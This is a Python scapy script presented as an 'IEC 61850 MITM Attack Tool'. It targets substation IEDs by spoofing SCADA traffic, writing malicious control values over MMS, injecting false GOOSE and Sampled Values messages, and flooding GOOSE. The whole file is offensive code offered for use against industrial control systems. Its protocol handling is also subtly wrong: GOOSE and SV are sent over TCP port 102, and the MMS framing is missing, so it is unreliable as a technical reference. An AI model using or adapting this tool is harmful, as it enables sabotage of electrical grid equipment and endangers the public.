from scapy.all import *
import struct
import time

# Configuration réseau
ip_master = "192.168.1.100"  # HMI/SCADA
ip_ied = "192.168.1.20"      # IED (Intelligent Electronic Device)
sport = 102                   # Port MMS standard
dport = 102
seq_num = 100000
ack_num = 200000

# IEC 61850 - MMS Write Request
def create_mms_write_request():
    # En-tête MMS
    mms_type = 0xA0           # Write Request
    invoke_id = 0x0001
    variable_access_specification = 0xA1
    
    # Object Name (Logical Node)
    object_name = b"LD0/LLN0$ST$Oper$ctlVal"
    
    # Data (valeur malveillante)
    data_value = struct.pack(">I", 0xDEADBEEF)  # Valeur malveillante
    
    # Construction du payload
    payload = struct.pack(">BBH", mms_type, invoke_id, len(object_name)) + object_name + data_value
    
    return payload

# IEC 61850 - MMS Read Request
def create_mms_read_request():
    mms_type = 0xA1           # Read Request
    invoke_id = 0x0002
    variable_access_specification = 0xA1
    
    # Object Name
    object_name = b"LD0/LLN0$ST$Oper$stVal"
    
    payload = struct.pack(">BBH", mms_type, invoke_id, len(object_name)) + object_name
    
    return payload

# IEC 61850 - GOOSE Message (Attaque critique)
def create_goose_message():
    # En-tête GOOSE
    gocb_ref = b"LD0/LLN0$GO$gcbOper"
    time_allowed_to_live = 0x0004
    dat_set = b"LD0/LLN0$Oper"
    go_id = b"Oper"
    t = 0x00000000            # Timestamp
    st_num = 0x0001           # State number
    sq_num = 0x0001           # Sequence number
    test = 0x00               # Test flag
    conf_rev = 0x00000001     # Configuration revision
    nds_com = 0x00            # Needs commissioning
    num_dat_set_entries = 0x0001
    
    # Données GOOSE malveillantes
    goose_data = struct.pack(">I", 0xCAFEBABE)  # Valeur malveillante
    
    # Construction du payload
    payload = struct.pack(">H", len(gocb_ref)) + gocb_ref
    payload += struct.pack(">H", time_allowed_to_live)
    payload += struct.pack(">H", len(dat_set)) + dat_set
    payload += struct.pack(">H", len(go_id)) + go_id
    payload += struct.pack(">I", t)
    payload += struct.pack(">H", st_num)
    payload += struct.pack(">H", sq_num)
    payload += struct.pack(">B", test)
    payload += struct.pack(">I", conf_rev)
    payload += struct.pack(">B", nds_com)
    payload += struct.pack(">H", num_dat_set_entries)
    payload += goose_data
    
    return payload

# IEC 61850 - Sampled Values (SV) Message
def create_sv_message():
    # En-tête SV
    sv_id = b"LD0/LLN0$SV$svcbMeas"
    dat_set = b"LD0/LLN0$Meas"
    smp_cnt = 0x0001          # Sample count
    conf_rev = 0x00000001     # Configuration revision
    smp_synch = 0x00          # Sample synchronization
    smp_rate = 0x0001         # Sample rate
    num_dat_set_entries = 0x0001
    
    # Données SV malveillantes
    sv_data = struct.pack(">f", 999.99)  # Valeur de mesure malveillante
    
    # Construction du payload
    payload = struct.pack(">H", len(sv_id)) + sv_id
    payload += struct.pack(">H", len(dat_set)) + dat_set
    payload += struct.pack(">H", smp_cnt)
    payload += struct.pack(">I", conf_rev)
    payload += struct.pack(">B", smp_synch)
    payload += struct.pack(">H", smp_rate)
    payload += struct.pack(">H", num_dat_set_entries)
    payload += sv_data
    
    return payload

# IEC 61850 - Association Request (Reconnaissance)
def create_association_request():
    # En-tête MMS
    mms_type = 0xB0           # Initiate Request
    local_detail_calling = 0x00000000
    proposed_max_serv_outstanding_calling = 0x0001
    proposed_max_serv_outstanding_called = 0x0001
    proposed_data_structure_nesting_level = 0x0001
    
    # Service Support
    service_support = 0x00
    
    payload = struct.pack(">BIIIIB",
        mms_type,
        local_detail_calling,
        proposed_max_serv_outstanding_calling,
        proposed_max_serv_outstanding_called,
        proposed_data_structure_nesting_level,
        service_support
    )
    
    return payload

# Fonction d'attaque MITM
def iec61850_mitm_attack():
    print("[+] Démarrage de l'attaque IEC 61850 MITM...")
    
    # 1. Reconnaissance via MMS
    print("[+] Phase 1: Reconnaissance MMS...")
    assoc_payload = create_association_request()
    ip = IP(src=ip_master, dst=ip_ied)
    tcp = TCP(sport=sport, dport=dport, flags="PA", seq=seq_num, ack=ack_num)
    assoc_packet = ip / tcp / Raw(load=assoc_payload)
    send(assoc_packet, verbose=1)
    
    time.sleep(1)
    
    # 2. Lecture des données critiques
    print("[+] Phase 2: Lecture des données critiques...")
    read_payload = create_mms_read_request()
    tcp.seq += len(assoc_payload)
    tcp.ack += 1
    read_packet = ip / tcp / Raw(load=read_payload)
    send(read_packet, verbose=1)
    
    time.sleep(1)
    
    # 3. Injection de données malveillantes via MMS
    print("[+] Phase 3: Injection de données malveillantes (MMS)...")
    write_payload = create_mms_write_request()
    tcp.seq += len(read_payload)
    tcp.ack += 1
    write_packet = ip / tcp / Raw(load=write_payload)
    send(write_packet, verbose=1)
    
    time.sleep(1)
    
    # 4. Injection de messages GOOSE malveillants
    print("[+] Phase 4: Injection de messages GOOSE malveillants...")
    goose_payload = create_goose_message()
    tcp.seq += len(write_payload)
    tcp.ack += 1
    goose_packet = ip / tcp / Raw(load=goose_payload)
    send(goose_packet, verbose=1)
    
    time.sleep(1)
    
    # 5. Injection de Sampled Values malveillants
    print("[+] Phase 5: Injection de Sampled Values malveillants...")
    sv_payload = create_sv_message()
    tcp.seq += len(goose_payload)
    tcp.ack += 1
    sv_packet = ip / tcp / Raw(load=sv_payload)
    send(sv_packet, verbose=1)
    
    print("[+] Attaque IEC 61850 terminée!")

# Fonction d'attaque GOOSE flooding
def goose_flooding_attack():
    print("[+] Attaque GOOSE flooding...")
    
    # Envoi massif de messages GOOSE
    for i in range(100):
        goose_payload = create_goose_message()
        ip = IP(src=ip_master, dst=ip_ied)
        tcp = TCP(sport=sport, dport=dport, flags="PA", seq=seq_num+i, ack=ack_num+i)
        packet = ip / tcp / Raw(load=goose_payload)
        send(packet, verbose=0)
        time.sleep(0.01)
    
    print("[+] Attaque GOOSE flooding terminée!")

# Fonction de reconnaissance
def iec61850_reconnaissance():
    print("[+] Reconnaissance IEC 61850...")
    
    # Tentative d'association MMS
    assoc_payload = create_association_request()
    
    ip = IP(src=ip_master, dst=ip_ied)
    tcp = TCP(sport=sport, dport=dport, flags="PA", seq=seq_num, ack=ack_num)
    packet = ip / tcp / Raw(load=assoc_payload)
    
    send(packet, verbose=1)
    print("[+] Paquet de reconnaissance MMS envoyé")

if __name__ == "__main__":
    print("=== IEC 61850 MITM Attack Tool ===")
    print("1. Reconnaissance")
    print("2. Attaque complète")
    print("3. Attaque GOOSE flooding")
    
    choice = input("Choix (1/2/3): ")
    
    if choice == "1":
        iec61850_reconnaissance()
    elif choice == "2":
        iec61850_mitm_attack()
    elif choice == "3":
        goose_flooding_attack()
    else:
        print("Choix invalide")
